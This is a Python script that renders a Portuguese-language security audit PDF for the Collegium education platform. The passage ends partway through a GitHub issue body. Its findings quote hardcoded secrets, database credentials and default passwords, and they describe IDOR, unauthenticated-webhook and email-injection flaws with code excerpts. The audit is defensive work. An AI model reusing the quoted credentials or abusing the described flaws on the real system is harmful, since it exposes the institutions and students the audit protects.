#!/usr/bin/env python3
"""
Relatório de Auditoria de Segurança — Collegium (Solo Learning)
Gera PDF visualmente amigável com gráficos e tabelas de achados.
"""
import os, sys, html as html_mod
from datetime import datetime

# ── Matplotlib setup (Agg backend for headless) ──
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
from matplotlib.patches import FancyBboxPatch
import matplotlib.ticker as ticker

from reportlab.lib.pagesizes import A4
from reportlab.lib.units import mm, cm
from reportlab.lib.colors import HexColor, white, black
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_RIGHT, TA_JUSTIFY
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image,
    PageBreak, KeepTogether, HRFlowable
)
from reportlab.platypus.flowables import Flowable
from reportlab.lib import colors

# ── Colors ──
C_CRITICA   = HexColor('#B91C1C')
C_ALTA      = HexColor('#EA580C')
C_MEDIA     = HexColor('#D97706')
C_BAIXA     = HexColor('#2563EB')
C_FORTE     = HexColor('#059669')
C_BG_LIGHT  = HexColor('#F8FAFC')
C_HEADER_BG = HexColor('#1E293B')
C_ROW_ALT   = HexColor('#F1F5F9')

# ── Styles ──
styles = getSampleStyleSheet()

def make_style(name, **kw):
    base = kw.pop('parent', styles['Normal'])
    return ParagraphStyle(name, parent=base, **kw)

sTitle    = make_style('STitle',    fontSize=26, leading=32, textColor=C_HEADER_BG, alignment=TA_CENTER, spaceAfter=4*mm, fontName='Helvetica-Bold')
sSubtitle = make_style('SSubtitle', fontSize=13, leading=17, textColor=HexColor('#475569'), alignment=TA_CENTER, spaceAfter=2*mm)
sH1       = make_style('SH1',       fontSize=18, leading=22, textColor=C_HEADER_BG, fontName='Helvetica-Bold', spaceBefore=8*mm, spaceAfter=4*mm)
sH2       = make_style('SH2',       fontSize=14, leading=18, textColor=HexColor('#334155'), fontName='Helvetica-Bold', spaceBefore=5*mm, spaceAfter=3*mm)
sH3       = make_style('SH3',       fontSize=11, leading=14, textColor=HexColor('#475569'), fontName='Helvetica-Bold', spaceBefore=3*mm, spaceAfter=2*mm)
sBody     = make_style('SBody',     fontSize=9.5, leading=13, textColor=HexColor('#1E293B'), alignment=TA_JUSTIFY, spaceAfter=2*mm)
sBodySm   = make_style('SBodySm',   fontSize=8.5, leading=11, textColor=HexColor('#334155'), alignment=TA_LEFT)
sCode     = make_style('SCode',     fontSize=8, leading=10, textColor=HexColor('#0F172A'), fontName='Courier', backColor=HexColor('#F1F5F9'), spaceBefore=1*mm, spaceAfter=1*mm, leftIndent=4*mm)
sChipCrit = make_style('SChipCrit', fontSize=8, leading=10, textColor=white, fontName='Helvetica-Bold', alignment=TA_CENTER)
sChipHigh = make_style('SChipHigh', fontSize=8, leading=10, textColor=white, fontName='Helvetica-Bold', alignment=TA_CENTER)
sChipMed  = make_style('SChipMed',  fontSize=8, leading=10, textColor=white, fontName='Helvetica-Bold', alignment=TA_CENTER)
sChipLow  = make_style('SChipLow',  fontSize=8, leading=10, textColor=white, fontName='Helvetica-Bold', alignment=TA_CENTER)
sChipStr  = make_style('SChipStr',  fontSize=8, leading=10, textColor=white, fontName='Helvetica-Bold', alignment=TA_CENTER)
sFooter   = make_style('SFooter',   fontSize=7.5, leading=9, textColor=HexColor('#94A3B8'), alignment=TA_CENTER)
sIssue    = make_style('SIssue',    fontSize=8.5, leading=12, textColor=HexColor('#1E293B'), fontName='Courier', backColor=HexColor('#F8FAFC'), borderPadding=4, spaceBefore=2*mm, spaceAfter=2*mm)

# ── Findings data ──
findings = [
    # id, severity, category, file, line, short_desc, detail, code_snippet
    ('CRED-001', 'CRÍTICA', 'CHAVES EXPOSTAS',
     'backend/src/plugins/auth.ts', '7',
     'Segredo JWT hardcoded como fallback',
     'A chave de assinatura JWT usa fallback hardcoded: `\'supersecret_solen_key_123\'`. Se a variável de ambiente não estiver definida, qualquer pessoa que leia o código pode assinar tokens JWT válidos para qualquer usuário/role.',
     'secret: process.env.JWT_SECRET || \'supersecret_solen_key_123\''),
    ('CRED-002', 'CRÍTICA', 'CHAVES EXPOSTAS',
     'backend/.env', '2-5',
     'API keys (Gemini, NVIDIA) e JWT_SECRET no arquivo .env',
     'O arquivo .env contém chaves de API reais: GEMINI_API_KEY, NVIDIA_API_KEY e JWT_SECRET. Embora .env esteja no .gitignore, o arquivo existe no diretório de trabalho com valores reais. Se o repositório já foi clonado com estes valores ou se alguém esquecer de adicionar .env ao .gitignore antes do primeiro commit, as chaves ficam expostas no histórico git.',
     'JWT_SECRET="supersecretjwtkey"\nGEMINI_API_KEY="AQ.Ab8RN..."\nNVIDIA_API_KEY="nvapi-ZDg3qf..."'),
    ('CRED-003', 'CRÍTICA', 'CHAVES EXPOSTAS',
     'backend/docker-compose.yml', '5-6',
     'Credenciais de banco de dados hardcoded no docker-compose',
     'As credenciais do PostgreSQL estão hardcoded diretamente no docker-compose.yml: solen_user / solen_password. Este arquivo é versionado no git, expondo as credenciais a qualquer pessoa com acesso ao repositório.',
     'POSTGRES_USER: solen_user\nPOSTGRES_PASSWORD: solen_password\nPOSTGRES_DB: solen_db'),
    ('CRED-004', 'CRÍTICA', 'CHAVES EXPOSTAS',
     'backend/src/routes/admin.ts', '452,504,549',
     'Senhas de alunos armazenadas em TEXTO PLANO (sem hash)',
     'Três cenários armazenam a senha do aluno como texto plano, sem hash bcrypt: CREATE (\'INITIAL_SUMMONING_CODE_LOGIN\'), BATCH (\'SUMMONING_CODE\'), RESET (\'RESET_TO_SUMMONING_CODE\'). Se o banco for comprometido, todas as senhas ficam diretamente legíveis.',
     '// admin.ts:452\npassword: \'INITIAL_SUMMONING_CODE_LOGIN\' // Placeholder\n\n// admin.ts:504\npassword: \'SUMMONING_CODE\'\n\n// admin.ts:549\npassword: \'RESET_TO_SUMMONING_CODE\''),
    ('CRED-005', 'ALTA', 'CHAVES EXPOSTAS',
     'backend/src/routes/superadmin.ts', '60,163',
     'Senhas padrão hardcoded para Arquitetos',
     'A senha padrão \'Solen2026\' é hardcoded para criação e reset de arquitetos. Qualquer pessoa que leia o código sabe a senha padrão de qualquer Arquiteto que não tenha feito o primeiro acesso.',
     '// superadmin.ts:60\nconst rawPassword = password || \'Solen2026\';\n\n// superadmin.ts:163\nconst defaultPassword = await bcrypt.hash(\'Solen2026\', 10);'),
    ('AUTH-001', 'CRÍTICA', 'PERMISSÃO NO SERVIDOR',
     'backend/src/routes/webhooks.ts', '1-37',
     'Webhook de billing SEM AUTENTICAÇÃO — qualquer pessoa pode alterar status de pagamento',
     'O endpoint POST /webhooks/billing/webhook não possui nenhum hook de autenticação (authenticate) nem verificação de assinatura do webhook. Um atacante pode enviar um payload com type=\'invoice.paid\' e mudar o status de qualquer instituição para ATIVO, ou cancelar qualquer conta com type=\'subscription.canceled\'.',
     'export const webhookRoutes: FastifyPluginAsync = async (fastify) => {\n  // NENHUM fastify.addHook aqui!\n  fastify.post(\'/billing/webhook\', async (request, reply) => {\n    const { type, data } = request.body;\n    // ... processa sem validar autenticidade do payload\n  });\n};'),
    ('IDOR-001', 'CRÍTICA', 'IDOR',
     'backend/src/routes/admin.ts', '441-460',
     'Reatribuição de aluno existente a outra instituição sem verificar posse',
     'Ao cadastrar um aluno via POST /admin/stomes, se a matrícula já existe, o código faz update do turmaId, turno, instituicao e institutionId SEM verificar se o aluno pertence à mesma instituição do Arquiteto que faz a requisição. Um Arquiteto da instituição A pode reatribuir um aluno da instituição B.',
     'if (existingStudent) {\n  const updatedStudent = await prisma.user.update({\n    where: { id: existingStudent.id },\n    data: {\n      turmaId,\n      turno,\n      instituicao: request.user.instituicao,\n      institutionId: request.user.institutionId || null\n    }\n  });\n  // ⚠️ Sem verificação: existingStudent.instituicao === request.user.instituicao'),
    ('IDOR-002', 'ALTA', 'IDOR',
     'backend/src/routes/admin.ts', '560-592',
     'Lote de alunos não verifica instituição de matrículas existentes',
     'O cadastro em lote POST /admin/students/batch não verifica se alunos com matrículas existentes pertencem à instituição do Arquiteto. Um Arquiteto pode assumir o controle de alunos de outra instituição apenas incluindo suas matrículas na planilha.',
     'for (const s of students) {\n  await prisma.user.create({\n    data: {\n      nome: s.nome.trim(),\n      matricula: s.matricula.toLowerCase().trim(),\n      // ... sem verificar instituição de matrículas existentes\n    }\n  });\n}'),
    ('IDOR-003', 'ALTA', 'IDOR',
     'backend/src/routes/admin.ts', 'matrix/audit (L895+)',
     'Matriz de auditoria aceita institutionId/instituicao como query params',
     'O endpoint GET /admin/matrix/audit aceita os parâmetros institutionId e instituicao na query string, permitindo que um Arquiteto consulte dados de outra instituição. O hook validateInstitution apenas valida turmaId, disciplinaId e targetUserId — não os parâmetros de instituição.',
     'fastify.get(\'/matrix/audit\', {\n  // query: { institutionId?, instituicao? }\n  // validateInstitution NÃO valida esses params!\n});'),
    ('ISOLATION-001', 'ALTA', 'ISOLAMENTO DE DADOS',
     'backend/src/routes/bounty.ts', '123-135',
     'GET /bounty/active retorna bugs de TODAS as instituições',
     'O endpoint GET /bounty/active não filtra por instituição. Um usuário autenticado de qualquer instituição pode ver os relatos de bugs de todas as instituições, incluindo nomes, matrículas e descrições.',
     'fastify.get(\'/active\', async (request, reply) => {\n  const bugs = await prisma.bountyBug.findMany({\n    include: { user: { select: { nome: true, matricula: true } } },\n    orderBy: { createdAt: \'desc\' }\n    // ⚠️ Sem filtro de instituição!\n  });\n});'),
    ('ISOLATION-002', 'MÉDIA', 'ISOLAMENTO DE DADOS',
     'backend/src/routes/professor.ts', '69-80',
     'Alunos não atribuídos listados globalmente para Professores',
     'Quando um Professor consulta GET /professor/students?unassigned=true, a query retorna TODOS os alunos sem turma do banco, sem filtro de instituição. Um Professor da instituição A pode ver a lista de alunos não atribuídos da instituição B.',
     'if (unassigned === \'true\') {\n  where.turmaId = null;\n  // ⚠️ Sem filtro de turmaDisciplinas ou instituição\n}'),
    ('XSS-001', 'ALTA', 'XSS / INJEÇÃO HTML',
     'backend/src/routes/bounty.ts', '55',
     'Input de usuário injetado em HTML de e-mail sem sanitização',
     'A descrição do bug report é injetada diretamente no template HTML do e-mail com apenas replace de \\n por <br/>. Um atacante pode injetar HTML/JavaScript no campo description que será renderizado no e-mail do desenvolvedor.',
     'html: `\n  <blockquote>\n    ${description.replace(/\\n/g, \'<br/>\')}\n  </blockquote>\n`\n// ⚠️ description = input do usuário, sem escape HTML'),
    ('CORS-001', 'MÉDIA', 'CONFIGURAÇÃO INSEGURA',
     'backend/src/server.ts', '14-17',
     'CORS configurado com origin: \'*\' — qualquer origem pode fazer requisições',
     'O CORS permite todas as origens com todos os métodos. Embora a API use JWT (o que mitiga parcialmente), o CORS permissivo facilita ataques CSRF em endpoints que não usam token ou facilita phishing.',
     'server.register(cors, {\n  origin: \'*\',\n  methods: [\'GET\', \'POST\', \'PUT\', \'DELETE\', \'OPTIONS\', \'PATCH\'],\n  allowedHeaders: [\'Content-Type\', \'Authorization\', \'Origin\', \'Accept\']\n});'),
    ('AUTH-002', 'MÉDIA', 'AUTENTICAÇÃO',
     'backend/src/plugins/auth.ts', '12-15',
     'Token JWT aceito via query string (?token=...)',
     'O plugin de autenticação aceita tokens na query string além do header Authorization. Tokens em URLs ficam em logs do servidor, histórico do navegador e referrers.',
     'const queryToken = (request.query as any)?.token;\nif (queryToken && !request.headers.authorization) {\n  request.headers.authorization = `Bearer ${queryToken}`;\n}'),
    ('CONFIG-001', 'BAIXA', 'CONFIGURAÇÃO FRACA',
     'backend/src/routes/admin.ts', '84',
     'Senha padrão \'1234\' para professores é trivialmente adivinhável',
     'A senha padrão para novos professores é \'1234\', um PIN de 4 dígitos. Embora o fluxo de primeiro acesso force troca, há uma janela de tempo em que o professor pode ser acessado com esta senha.',
     'const defaultPassword = await bcrypt.hash(\'1234\', 10);'),
    ('CONFIG-002', 'BAIXA', 'CONFIGURAÇÃO FRACA',
     'backend/src/routes/admin.ts', '134',
     'Código de invocação padrão \'1234\' para turmas',
     'O código de invocação padrão para novas turmas é \'1234\'. Alunos podem entrar em qualquer turma usando este código padrão se o Arquiteto não alterá-lo.',
     'codigoInvocacao: codigoInvocacao ? codigoInvocacao.trim() : "1234"'),
]

# Counts
severity_counts = {'CRÍTICA': 0, 'ALTA': 0, 'MÉDIA': 0, 'BAIXA': 0}
category_counts = {}
for f in findings:
    severity_counts[f[1]] = severity_counts.get(f[1], 0) + 1
    cat = f[2]
    category_counts[cat] = category_counts.get(cat, 0) + 1

# Strengths
strengths = [
    ('plugins/security.ts — validateInstitution', 'Hook preHandler valida corretamente turmaId, disciplinaId e targetUserId contra a instituição do usuário em todas as rotas admin/professor/quests. Consultas cruzadas de instituição são bloqueadas com 403.'),
    ('plugins/security.ts — validateTenantStatus', 'Bloqueia usuários de instituições com status INADIMPLENTE ou CANCELADO. Admins (ADMIN) são corretamente isentos.'),
    ('routes/admin.ts — queries de listagem', 'As rotas GET /masters, GET /students, GET /turmas, GET /disciplinas filtram corretamente por instituicao do usuário autenticado.'),
    ('routes/superadmin.ts — autenticação', 'Todas as rotas superadmin exigem role ADMIN via hook preHandler dedicado, corretamente encadeado com authenticate.'),
    ('routes/professor.ts — filtro de turmas', 'As rotas do professor filtram corretamente por turmaDisciplinas.some(professorId), garantindo que o professor só veja suas turmas.'),
    ('routes/bounty.ts — posse em interações', 'Os endpoints /seen e /response verificam bug.userId !== request.user.id antes de permitir a ação, prevenindo IDOR nestes fluxos.'),
    ('routes/auth.ts — autenticação', 'As rotas /first-access e /me usam preValidation com authenticate, garantindo que apenas usuários logados acessem.'),
    ('bcrypt para senhas de professor', 'Senhas de professores e arquitetos são corretamente hasheadas com bcrypt (cost 10) antes de persistir no banco.'),
    ('.env no .gitignore', 'O arquivo .env está listado tanto no .gitignore raiz quanto no backend/.gitignore, prevenindo commits acidentais.'),
]

# Strength counts (for report context)
strength_count = len(strengths)

# ── Generate charts ──
chart_dir = '/tmp/security_charts'
os.makedirs(chart_dir, exist_ok=True)

# Donut chart by severity
fig1, ax1 = plt.subplots(figsize=(5, 3.5), dpi=150)
labels = [k for k, v in severity_counts.items() if v > 0]
sizes = [v for v in severity_counts.values() if v > 0]
colors_list = ['#B91C1C' if k == 'CRÍTICA' else
               '#EA580C' if k == 'ALTA' else
               '#D97706' if k == 'MÉDIA' else
               '#2563EB' for k in labels]
explode = [0.03] * len(labels)
wedges, texts, autotexts = ax1.pie(sizes, labels=labels, colors=colors_list,
    autopct='%1.0f%%', startangle=90, pctdistance=0.78, explode=explode,
    textprops={'fontsize': 9, 'fontweight': 'bold'})
for t in autotexts:
    t.set_color('white')
    t.set_fontsize(9)
centre = plt.Circle((0, 0), 0.55, fc='white')
ax1.add_artist(centre)
ax1.text(0, 0.06, str(sum(sizes)), ha='center', va='center', fontsize=20, fontweight='bold', color='#1E293B')
ax1.text(0, -0.12, 'achados', ha='center', va='center', fontsize=9, color='#64748B')
ax1.set_title('Achados por Severidade', fontsize=12, fontweight='bold', pad=10, color='#1E293B')
plt.tight_layout()
fig1.savefig(f'{chart_dir}/donut_severity.png', bbox_inches='tight', facecolor='white')
plt.close()

# Bar chart by category
fig2, ax2 = plt.subplots(figsize=(6, 3.5), dpi=150)
cat_labels = list(category_counts.keys())
cat_sizes = list(category_counts.values())
cat_colors = []
for cl in cat_labels:
    if 'CHAVE' in cl or 'EXPOSTA' in cl:
        cat_colors.append('#B91C1C')
    elif 'PERMISSÃO' in cl or 'IDOR' in cl:
        cat_colors.append('#EA580C')
    elif 'ISOLAMENTO' in cl or 'XSS' in cl:
        cat_colors.append('#D97706')
    else:
        cat_colors.append('#2563EB')
bars = ax2.barh(cat_labels, cat_sizes, color=cat_colors, height=0.55, edgecolor='white', linewidth=0.5)
for bar, val in zip(bars, cat_sizes):
    ax2.text(bar.get_width() + 0.15, bar.get_y() + bar.get_height()/2, str(val),
             va='center', fontsize=10, fontweight='bold', color='#1E293B')
ax2.set_xlabel('Número de Achados', fontsize=9, color='#475569')
ax2.set_title('Achados por Categoria', fontsize=12, fontweight='bold', pad=10, color='#1E293B')
ax2.set_xlim(0, max(cat_sizes) + 1.5)
ax2.tick_params(axis='y', labelsize=9)
ax2.tick_params(axis='x', labelsize=8)
ax2.spines['top'].set_visible(False)
ax2.spines['right'].set_visible(False)
plt.tight_layout()
fig2.savefig(f'{chart_dir}/bar_category.png', bbox_inches='tight', facecolor='white')
plt.close()

# ── PDF Document ──
output_path = 'docs/security-audit/relatorio-auditoria-seguranca.pdf'
doc = SimpleDocTemplate(
    output_path, pagesize=A4,
    leftMargin=2*cm, rightMargin=2*cm, topMargin=2.5*cm, bottomMargin=2.5*cm,
    title='Relatório de Auditoria de Segurança — Collegium',
    author='Codebuff Security Audit'
)

page_width = A4[0] - 4*cm

def header_footer(canvas, doc):
    canvas.saveState()
    canvas.setFont('Helvetica', 7.5)
    canvas.setFillColor(HexColor('#94A3B8'))
    canvas.drawString(2*cm, A4[1] - 1.5*cm, 'Relatório de Auditoria de Segurança — Collegium (Solo Learning)')
    canvas.drawRightString(A4[0] - 2*cm, A4[1] - 1.5*cm, f'Página {doc.page}')
    canvas.setStrokeColor(HexColor('#E2E8F0'))
    canvas.line(2*cm, A4[1] - 1.7*cm, A4[0] - 2*cm, A4[1] - 1.7*cm)
    canvas.line(2*cm, 1.8*cm, A4[0] - 2*cm, 1.8*cm)
    canvas.drawCentredString(A4[0]/2, 1.2*cm, f'Gerado em {datetime.now().strftime("%d/%m/%Y %H:%M")} — Confidencial')
    canvas.restoreState()

story = []

# ══════════════════════════════════════════════
# COVER PAGE
# ══════════════════════════════════════════════
story.append(Spacer(1, 50*mm))
story.append(Paragraph('Relatório de Auditoria de Segurança', sTitle))
story.append(Paragraph('Collegium (Solo Learning)', make_style('CoverProject', fontSize=20, leading=26, textColor=HexColor('#475569'), alignment=TA_CENTER, spaceAfter=8*mm, fontName='Helvetica-Bold')))
story.append(HRFlowable(width='40%', thickness=2, color=C_CRITICA, spaceAfter=8*mm, spaceBefore=2*mm))
story.append(Paragraph(f'Data: {datetime.now().strftime("%d de %B de %Y").replace("August", "agosto").replace("September", "setembro").replace("June", "junho").replace("May", "maio").replace("July", "julho")}', make_style('CoverDate', fontSize=12, textColor=HexColor('#475569'), alignment=TA_CENTER, spaceAfter=4*mm)))
story.append(Paragraph('Escopo: Backend (Fastify + Prisma + PostgreSQL) e Frontend (Expo/React Native)', make_style('CoverScope', fontSize=11, textColor=HexColor('#64748B'), alignment=TA_CENTER, spaceAfter=10*mm)))

# Methodology note
story.append(Spacer(1, 8*mm))
story.append(Paragraph('<b>Nota Metodológica</b>', make_style('CoverMeta', fontSize=11, textColor=C_HEADER_BG, alignment=TA_CENTER, spaceAfter=3*mm, fontName='Helvetica-Bold')))
meta_text = (
    'Cada categoria de auditoria foi mapeada para a stack detectada: '
    '<b>Banco sem tranca</b> → isolamento multi-tenant via campo <i>instituicao</i> / <i>institutionId</i> no Prisma (equivalente a RLS); '
    '<b>Permissão no navegador</b> → hooks Fastify <i>preHandler</i> com verificação de <i>role</i>; '
    '<b>IDOR</b> → handlers de rota com parâmetros de ID no path/body/query; '
    '<b>Chaves expostas</b> → .env, docker-compose, código-fonte com defaults hardcoded; '
    '<b>Inputs sem tratamento</b> → templates HTML de e-mail, dangerouslySetInnerHTML (Expo/React Native).'
)
story.append(Paragraph(meta_text, make_style('CoverMetaText', fontSize=9, leading=13, textColor=HexColor('#475569'), alignment=TA_CENTER, leftIndent=1*cm, rightIndent=1*cm)))
story.append(PageBreak())

# ══════════════════════════════════════════════
# TABLE OF CONTENTS
# ══════════════════════════════════════════════
story.append(Paragraph('Sumário', sH1))
toc_items = [
    '1. Resumo Executivo',
    '2. Pontos Fortes e Pontos Fracos',
    '3. Achados por Categoria',
    '   3.1 Chaves Expostas (Hardcoded)',
    '   3.2 Permissão Definida no Servidor',
    '   3.3 IDOR',
    '   3.4 Isolamento de Dados',
    '   3.5 XSS / Injeção HTML',
    '   3.6 Configuração Insegura',
    '4. Recomendações Priorizadas',
    '5. Issues para o GitHub',
]
for item in toc_items:
    story.append(Paragraph(item, make_style('TOC', fontSize=10, leading=16, textColor=HexColor('#334155'), leftIndent=5*mm)))
story.append(PageBreak())

# ══════════════════════════════════════════════
# 1. RESUMO EXECUTIVO
# ══════════════════════════════════════════════
story.append(Paragraph('1. Resumo Executivo', sH1))
total = sum(severity_counts.values())
story.append(Paragraph(
    f'Foram identificados <b>{total} achados</b> de segurança ao longo de todas as rotas do backend, plugins de autenticação, configuração de deploy e templates de e-mail. '
    f'Os achados são distribuídos da seguinte forma:',
    sBody))

# Summary table
sum_data = [
    [Paragraph('<b>Severidade</b>', sBodySm), Paragraph('<b>Quantidade</b>', sBodySm), Paragraph('<b>%</b>', sBodySm)],
    ['🔴 Crítica', str(severity_counts['CRÍTICA']), f'{severity_counts["CRÍTICA"]*100//total}%'],
    ['🟠 Alta', str(severity_counts['ALTA']), f'{severity_counts["ALTA"]*100//total}%'],
    ['🟡 Média', str(severity_counts['MÉDIA']), f'{severity_counts["MÉDIA"]*100//total}%'],
    ['🔵 Baixa', str(severity_counts['BAIXA']), f'{severity_counts["BAIXA"]*100//total}%'],
]
sum_table = Table(sum_data, colWidths=[page_width*0.4, page_width*0.3, page_width*0.3])
sum_table.setStyle(TableStyle([
    ('BACKGROUND', (0,0), (-1,0), C_HEADER_BG),
    ('TEXTCOLOR', (0,0), (-1,0), white),
    ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
    ('FONTSIZE', (0,0), (-1,-1), 9),
    ('ALIGN', (1,0), (-1,-1), 'CENTER'),
    ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
    ('GRID', (0,0), (-1,-1), 0.5, HexColor('#CBD5E1')),
    ('ROWBACKGROUNDS', (0,1), (-1,-1), [white, C_ROW_ALT]),
    ('TOPPADDING', (0,0), (-1,-1), 4),
    ('BOTTOMPADDING', (0,0), (-1,-1), 4),
]))
story.append(sum_table)
story.append(Spacer(1, 5*mm))

# Charts
story.append(Image(f'{chart_dir}/donut_severity.png', width=page_width*0.55, height=page_width*0.38))
story.append(Spacer(1, 5*mm))
story.append(Image(f'{chart_dir}/bar_category.png', width=page_width*0.7, height=page_width*0.4))
story.append(PageBreak())

# ══════════════════════════════════════════════
# 2. PONTOS FORTES E FRACOS
# ══════════════════════════════════════════════
story.append(Paragraph('2. Pontos Fortes e Pontos Fracos', sH1))

story.append(Paragraph('✅ Pontos Fortes', sH2))
for title, desc in strengths:
    story.append(Paragraph(f'<b>{title}</b>', make_style('SFTitle', fontSize=9.5, textColor=C_FORTE, fontName='Helvetica-Bold', spaceBefore=2*mm, spaceAfter=0.5*mm)))
    story.append(Paragraph(desc, make_style('SFDesc', fontSize=9, leading=12, textColor=HexColor('#334155'), leftIndent=4*mm, spaceAfter=1*mm)))

story.append(Spacer(1, 4*mm))
story.append(Paragraph('❌ Pontos Fracos Centrais', sH2))
weaknesses = [
    'Senhas de alunos armazenadas em texto plano (sem bcrypt) — impacto máximo se o banco for comprometido.',
    'Webhook de billing sem autenticação — qualquer pessoa pode alterar status financeiro de instituições.',
    'Reatribuição de alunos entre instituições via POST /admin/stomes sem verificação de posse.',
    'Chaves de API (Gemini, NVIDIA) e JWT secret no repositório com fallback hardcoded.',
    'CORS permissivo (origin: *) que facilita ataques cross-origin.'
]
for w in weaknesses:
    story.append(Paragraph(f'• {w}', make_style('Weakness', fontSize=9.5, leading=13, textColor=HexColor('#991B1B'), leftIndent=4*mm, spaceAfter=1*mm)))
story.append(PageBreak())

# ══════════════════════════════════════════════
# 3. ACHADOS DETALHADOS
# ══════════════════════════════════════════════
story.append(Paragraph('3. Achados por Categoria', sH1))

severity_styles = {
    'CRÍTICA': ('🔴', C_CRITICA, sChipCrit),
    'ALTA':    ('🟠', C_ALTA,    sChipHigh),
    'MÉDIA':   ('🟡', C_MEDIA,   sChipMed),
    'BAIXA':   ('🔵', C_BAIXA,   sChipLow),
}

category_groups = {}
for f in findings:
    cat = f[2]
    if cat not in category_groups:
        category_groups[cat] = []
    category_groups[cat].append(f)

cat_order = ['CHAVES EXPOSTAS', 'PERMISSÃO NO SERVIDOR', 'IDOR', 'ISOLAMENTO DE DADOS', 'XSS / INJEÇÃO HTML', 'CONFIGURAÇÃO INSEGURA']

cat_section_num = 0
for cat in cat_order:
    if cat not in category_groups:
        continue
    cat_section_num += 1
    story.append(Paragraph(f'3.{cat_section_num} {cat}', sH2))

    for f in category_groups[cat]:
        fid, sev, _, ffile, fline, fshort, fdetail, fcode = f
        emoji, sev_color, chip_style = severity_styles[sev]

        # Finding card
        card_data = [
            [Paragraph(f'<b>{fid}</b>', make_style('FID', fontSize=8, fontName='Courier-Bold', textColor=HexColor('#475569'))),
             Paragraph(f'{emoji} {sev}', chip_style)],
            [Paragraph(f'<b>{fshort}</b>', make_style('FShort', fontSize=9.5, fontName='Helvetica-Bold', textColor=C_HEADER_BG, leading=12)), ''],
            [Paragraph(f'📄 <b>{ffile}</b>:{fline}', make_style('FFile', fontSize=8, fontName='Courier', textColor=HexColor('#64748B'))), ''],
            [Paragraph(fdetail, sBody), ''],
            [Paragraph(f'<font face="Courier" size="7.5" color="#1E293B"><pre>{fcode}</pre></font>', make_style('FCode', fontSize=7.5, leading=10, backColor=HexColor('#F1F5F9'), borderPadding=3)), ''],
        ]
        card_table = Table(card_data, colWidths=[page_width*0.78, page_width*0.22])
        card_table.setStyle(TableStyle([
            ('SPAN', (0,1), (1,1)),
            ('SPAN', (0,2), (1,2)),
            ('SPAN', (0,3), (1,3)),
            ('SPAN', (0,4), (1,4)),
            ('VALIGN', (0,0), (-1,-1), 'TOP'),
            ('ALIGN', (1,0), (1,0), 'RIGHT'),
            ('TOPPADDING', (0,0), (-1,-1), 2),
            ('BOTTOMPADDING', (0,0), (-1,-1), 2),
            ('LEFTPADDING', (0,0), (-1,-1), 3),
            ('RIGHTPADDING', (0,0), (-1,-1), 3),
            ('LINEBELOW', (0,-1), (-1,-1), 0.5, HexColor('#E2E8F0')),
        ]))
        story.append(KeepTogether([card_table, Spacer(1, 3*mm)]))

    story.append(Spacer(1, 3*mm))

story.append(PageBreak())

# ══════════════════════════════════════════════
# 4. RECOMENDAÇÕES PRIORIZADAS
# ══════════════════════════════════════════════
story.append(Paragraph('4. Recomendações Priorizadas', sH1))

recs = [
    ('P1 — URGENTE (imediato)', [
        'Remover TODOS os fallbacks hardcoded de segredos (JWT_SECRET, senhas padrão). Usar variáveis de ambiente obrigatórias com validação no startup que aborte o processo se não estiverem definidas.',
        'Rotacionar imediatamente o JWT_SECRET, GEMINI_API_KEY e NVIDIA_API_KEY — as atuais podem estar comprometidas.',
        'Adicionar autenticação/assinatura ao webhook /webhooks/billing/webhook (HMAC ou token compartilhado).',
        'Hashear senhas de alunos com bcrypt antes de persistir (corrigir os 3 pontos: create, batch, reset).',
    ]),
    ('P2 — ALTO (próxima sprint)', [
        'Corrigir o POST /admin/stomes: verificar se existingStudent.instituicao === request.user.instituicao antes de reatribuir.',
        'Adicionar filtro de instituição ao GET /bounty/active e GET /professor/students?unassigned=true.',
        'Restringir CORS para origens específicas do frontend (Expo/React Native).',
        'Sanitizar HTML na geração de e-mails: usar uma lib como DOMPurify ou escape manual de <, >, &.',
    ]),
    ('P3 — MÉDIO (curto prazo)', [
        'Remover suporte a token via query string (?token=).',
        'Forçar alteração de código de invocação na primeira criação de turma.',
        'Adicionar validação de startup para rejeitar senhas padrão known.',
        'Implementar auditoria (log) de todas as operações de escrita sensíveis.',
    ]),
]

for priority, items in recs:
    story.append(Paragraph(f'<b>{priority}</b>', make_style('RecP', fontSize=12, textColor=C_HEADER_BG, fontName='Helvetica-Bold', spaceBefore=5*mm, spaceAfter=2*mm)))
    for item in items:
        story.append(Paragraph(f'☐ {item}', make_style('RecItem', fontSize=9.5, leading=13, textColor=HexColor('#1E293B'), leftIndent=6*mm, spaceAfter=1.5*mm)))

story.append(PageBreak())

# ══════════════════════════════════════════════
# 5. ISSUES PARA O GITHUB
# ══════════════════════════════════════════════
story.append(Paragraph('5. Issues para o GitHub', sH1))
story.append(Paragraph('Cada issue abaixo está pronta para copiar e colar. Issues relacionadas triviais foram agrupadas.', sBody))
story.append(Spacer(1, 3*mm))

issues = [
    {
        'num': 1,
        'title': '[Segurança] Secrets hardcoded e API keys expostas no código-fonte',
        'labels': 'security, critical',
        'body': '''## Descrição
Vários segredos sensíveis estão hardcoded como fallbacks no código-fonte ou em arquivos de configuração versionados:

1. **JWT Secret hardcoded** em `backend/src/plugins/auth.ts:7`: `'supersecret_solen_key_123'`
2. **API keys no .env** (Gemini, NVIDIA) — arquivo existe no working tree com valores reais
3. **Credenciais PostgreSQL hardcoded** em `backend/docker-compose.yml:5-6`: `solen_user`/`solen_password`
4. **Senhas padrão hardcoded**: `'1234'` (professores), `'Solen2026'` (arquitetos)

## Evidência
```typescript
// backend/src/plugins/auth.ts:7
secret: process.env.JWT_SECRET || 'supersecret_solen_key_123'
```
```yaml
# backend/docker-compose.yml:5-6
POSTGRES_USER: solen_user
POSTGRES_PASSWORD: solen_password
```

## Impacto
Qualquer pessoa com acesso ao repositório pode assinar tokens JWT, acessar o banco de dados, ou usar as API keys. Se o JWT for comprometido, o atacante pode impersonar qualquer usuário incluindo ADMIN.

## Sugestão de Correção
- Remover TODOS os fallbacks hardcoded; usar `process.env.JWT_SECRET` sem `||` e validar no startup
- Adicionar validação no `server.ts` que aborte se `JWT_SECRET`, `GEMINI_API_KEY` não estiverem definidos
- Usar variáveis de ambiente no docker-compose via `${VARIABLE}` em vez de valores inline
- Rotacionar todas as chaves afetadas imediatamente

## Critérios de Aceite
- [ ] Nenhum segredo hardcoded no código-fonte
